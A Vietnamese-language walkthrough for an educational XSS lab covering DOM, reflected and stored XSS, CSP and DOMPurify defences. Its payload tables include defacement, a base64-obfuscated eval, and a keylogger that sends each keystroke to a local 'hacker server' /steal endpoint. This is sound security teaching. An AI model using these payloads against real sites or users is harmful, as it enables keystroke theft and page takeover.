# Hướng dẫn Demo — XSS Security Lab

---

## Tổng quan hệ thống

```
  Browser (Victim/Tester)
  localhost:5173
       │
       │  fetch() / cookie
       ▼
  ┌─────────────────────────────────────────┐
  │              Backend :3002              │
  │  Express + Prisma + MongoDB Atlas       │
  └─────────────────────────────────────────┘
       │
       │  stolen keystrokes (fetch)
       ▼
  ┌─────────────────────────────────────────┐
  │           Hacker Server :4000           │
  │  Express + WebSocket dashboard          │
  └─────────────────────────────────────────┘
```

**Phân công:**
| Person | Route | Nội dung |
|---|---|---|
| Person 1 | `/xss-demo` | DOM XSS lab |
| Person 2 | `/reflected-xss` | Reflected XSS lab |
| Person 3 | `/posts`, `/posts/new`, `/post/:id` | Stored XSS + Comments |
| Person 4 | `/security` | CSP toggle + Keylogger → Hacker Dashboard |

---

## Setup

1. **Backend:**
   ```
   cd backend && npm run dev
   ```
   → `http://localhost:3002`

2. **Frontend:**
   ```
   cd frontend && npm run dev
   ```
   → `http://localhost:5173`

3. **Hacker Server** (Person 4 cần):
   ```
   cd hacker-server && npm run dev
   ```
   → `http://localhost:4000`

4. **Đăng ký + Đăng nhập** tại `/register` rồi `/login`

---

## Person 1 — DOM XSS

**Route:** `/xss-demo`

```
User nhập payload vào input
         │
   ┌─────┴─────┐
   ▼           ▼
[VULNERABLE] [SAFE]
dangerously   {alertMessage}
SetInnerHTML  (React escape)
   │           │
   ▼           ▼
script chạy  text thuần
```

**Bước thực hiện:**
1. Mở `/xss-demo`
2. Mở **Theory panel** — đọc từng section để giải thích
3. Chọn payload từ **Quick Payload Library** → click **Use**
4. Click **Render**
5. Panel trái (đỏ) → alert/effect xuất hiện ⚠️
6. Panel phải (xanh) → hiển thị text nguyên vẹn ✅
7. Kéo xuống **Code Comparison** — giải thích code

**Payload gợi ý:**
- `<img src=x onerror="alert('DOM XSS')">` — phổ biến nhất
- `<svg onload="alert('XSS')">` — vector SVG
- `<b style="color:red;font-size:2em">Page Defaced!</b>` — visual defacement

---

## Person 2 — Reflected XSS

**Route:** `/reflected-xss`

```
Attacker tạo URL độc hại
         │
  /demo/reflected-xss?msg=<script>...</script>
         │
  Backend :3002 → res.send(`<p>${msg}</p>`)
         │
   ┌─────┴─────┐
   ▼           ▼
[VULNERABLE] [FIXED]
raw ${msg}   he.encode(msg)
   │           │
   ▼           ▼
script chạy  &lt;script&gt;
```

**Bước thực hiện:**
1. Mở `/reflected-xss`
2. Mở **Theory panel** — giải thích Reflected XSS
3. Kéo xuống **Side-by-Side Demo Links**
4. Click 🔗 cột **Vulnerable** → tab mới mở, alert xuất hiện ⚠️
5. Click 🔗 cột **Fixed** → text được encode, không thực thi ✅
6. Kéo xuống **Code Comparison** — so sánh backend code

---

## Person 3 — Stored XSS

**Route:** `/posts`, `/posts/new`, `/post/:id`

```
Attacker → POST /api/posts → MongoDB
                                │
                    Victim GET /api/posts/:id
                                │
              ┌─────────────────┴──────────────────┐
              ▼ Secure Mode OFF                    ▼ Secure Mode ON
        dangerouslySetInnerHTML             sanitizedContent / text
              │                                     │
        script thực thi ⚠️                   XSS bị chặn ✅
```

### 3a. Tạo bài với XSS payload
1. Đăng nhập → vào `/posts/new`
2. Mode mặc định: **Vulnerable Mode** (đỏ)
3. Mở **Payload Library** → chọn payload → click **Insert**
   - Gợi ý: **IMG onerror** (alert đơn giản), **Page Defacement** (visual), **Keylogger** (kết hợp với P4)
4. Điền title → click **Publish Post**
5. Toast warning "XSS payload detected (X risk)" xuất hiện ⚠️

### 3b. Xem bài — demo Secure Mode toggle

**Secure Mode ON (mặc định) — DOMPurify sanitize:**
| Payload gốc | Sau sanitize | Kết quả |
|---|---|---|
| `<img src=x onerror="alert()">` | `<img src="x">` | Ảnh broken, không có alert ✅ |
| `<svg onload="alert()">` | `<svg></svg>` | SVG rỗng, không chạy ✅ |
| `<details open ontoggle="alert()">` | `<details open="">text</details>` | Mở ra nhưng không chạy ✅ |
| `<a href="javascript:alert()">` | `<a>Click me</a>` | Link không có href ✅ |

**Bước demo:**
1. Mở bài vừa tạo — mặc định **Secure Mode ON** ✅
2. Click "View raw HTML source" — thấy payload gốc còn đầy đủ trong DB
3. Click **OFF (Vulnerable)** → payload thực thi, alert/defacement xuất hiện ⚠️
4. Click **ON (Safe)** → XSS biến mất ✅

### 3c. Risk badges
- Trang `/posts`: badge **CRITICAL / HIGH / MEDIUM / LOW / Clean** mỗi bài
- Stats bar: "X posts with XSS payload / Y clean"

### 3d. Stored XSS qua Comment

**DOMPurify comment mode: `ALLOWED_TAGS: []` — strip toàn bộ HTML, chỉ giữ text thuần**

1. Mở bài viết bất kỳ → kéo xuống phần **Comments**
2. Nhập payload: `<img src=x onerror="alert('XSS comment')">`
3. **Secure Mode OFF** → click **Post Comment** → ảnh broken + alert xuất hiện ⚠️
4. **Secure Mode ON** → comment hiển thị là text rỗng (img tag bị strip hoàn toàn) ✅
5. Toast warning "XSS payload detected in comment" xuất hiện
6. Thử payload `<svg onload="alert()">SVG text</svg>` → Secure ON chỉ còn "SVG text" ✅
7. Xóa comment: click 🗑 icon

---

## Person 4 — CSP + Keylogger

**Route:** `/security`

### 4a. CSP Toggle

```
Toggle CSP ON tại /security
       │
       ▼
Backend gắn header lên mọi response:
Content-Security-Policy: script-src 'self'
       │
       ▼
Mở localhost:3002/demo/reflected-xss?msg=<script>alert(1)</script>
       │
       ├── CSP OFF → alert xuất hiện          ⚠️
       └── CSP ON  → browser block script     ✅
                     Console F12: "Refused to execute inline script"
```

> **Quan trọng:** CSP header chỉ hiệu lực trên trang do **backend :3002 serve trực tiếp**.
> Không áp dụng cho React frontend :5173 (Vite không đính header đó).

**Bước thực hiện:**
1. Mở `/security` — đảm bảo **CSP: OFF**
2. Click nút **Open** → tab mới mở URL test
3. Alert hiện → script chạy ⚠️
4. Quay lại `/security` → Bật **CSP: ON**
5. Reload tab vừa mở → không có alert ✅
6. Mở Console (F12):
   ```
   Refused to execute inline script because it violates the
   Content Security Policy directive: "script-src 'self'"
   ```

### 4b. Keylogger → Hacker Dashboard

```
Attacker tạo bài với Keylogger payload
       │
       ▼
Victim mở bài → Secure Mode OFF → payload chạy
       │
       ▼ onkeypress
fetch("http://localhost:4000/steal?type=key&key=X")  ← new Image().src, no CORS
       │
       ▼
Hacker Server :4000 nhận keystroke real-time
Hacker Dashboard hiển thị từng phím bị đánh cắp ⚠️
       │
Bật Secure Mode ON → payload bị sanitize → không còn gửi data ✅
```

**Bước thực hiện:**
1. Chạy hacker server: `cd hacker-server && npm run dev`
2. Mở `http://localhost:4000` (Hacker Dashboard) — để sẵn một tab
3. Vào `/posts/new` → **Payload Library** → chọn **Keylogger** → **Insert** → **Publish Post**
4. Mở bài vừa tạo
5. Click **OFF (Vulnerable)** — payload `<img onerror>` chạy, `document.onkeypress` được gắn vào toàn trang
6. Nhấn bất kỳ phím nào trên bàn phím (A, B, Enter, Space...) — **không cần click vào ô input**, chỉ cần tab đang mở là đủ
7. Chuyển sang tab Hacker Dashboard → thấy từng phím xuất hiện real-time ⚠️
8. Quay lại tab bài viết → bật **ON (Safe)**
9. Gõ lại → Hacker Dashboard không còn nhận data ✅

> `document.onkeypress` lắng nghe toàn bộ trang, không phân biệt vị trí — victim chỉ cần gõ phím bình thường (search, scroll, nhập liệu...) là attacker đã nhận được.

---

## Payload Tham Khảo Nhanh

| Tên | Payload | Mục đích |
|---|---|---|
| IMG onerror | `<img src=x onerror="alert('XSS')">` | Phổ biến nhất, luôn work qua innerHTML |
| SVG onload | `<svg onload="alert('XSS')">` | Vector SVG |
| Details ontoggle | `<details open ontoggle="alert('XSS')">XSS</details>` | Tự trigger khi render |
| Video onerror | `<video src=x onerror="alert('XSS')">` | Media tag fallback |
| Link (click) | `<a href="javascript:alert('XSS')">Click me</a>` | Cần user click |
| Cookie read | `<img src=x onerror="alert('Cookie: '+document.cookie)">` | Đọc cookie (httpOnly → trống) |
| Page Defacement | `<img src=x onerror="document.body.innerHTML='<h1 style=color:red;font-size:5em;text-align:center;padding-top:30vh>HACKED</h1>'">` | Demo visual impact |
| Keylogger | `<img src=x onerror="document.addEventListener('keydown',function(e){new Image().src='http://localhost:4000/steal?type=key&key='+e.key})">` | Đánh cắp keystroke |
| Base64 Encoded | `<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">` | Obfuscate payload |

> **Note:** `<script>` qua innerHTML không execute (Chrome spec). `<input autofocus>` và `<iframe javascript:>` cũng bị Chrome block. Dùng `onerror`/`onload`/`ontoggle` thay thế.
> Cookie JWT được set `httpOnly: true` → JavaScript không đọc được `document.cookie`.

---

## Checklist Demo Nhanh

- [ ] Register + Login, header hiện username
- [ ] **P1** `/xss-demo`: payload chạy ở panel trái, text thuần ở panel phải
- [ ] **P2** `/reflected-xss`: link vulnerable → alert; link fixed → text encode
- [ ] **P3** `/posts/new`: tạo bài với payload → toast warning XSS detected
- [ ] **P3** Trang bài: Secure OFF → XSS chạy; Secure ON → XSS blocked
- [ ] **P3** `/posts`: stats bar, risk badges đúng màu
- [ ] **P3** Comments: payload → toast warning, render theo Secure Mode
- [ ] **P4** `/security`: CSP OFF → alert; CSP ON → browser block
- [ ] **P4** Keylogger: Hacker Dashboard nhận keystroke real-time
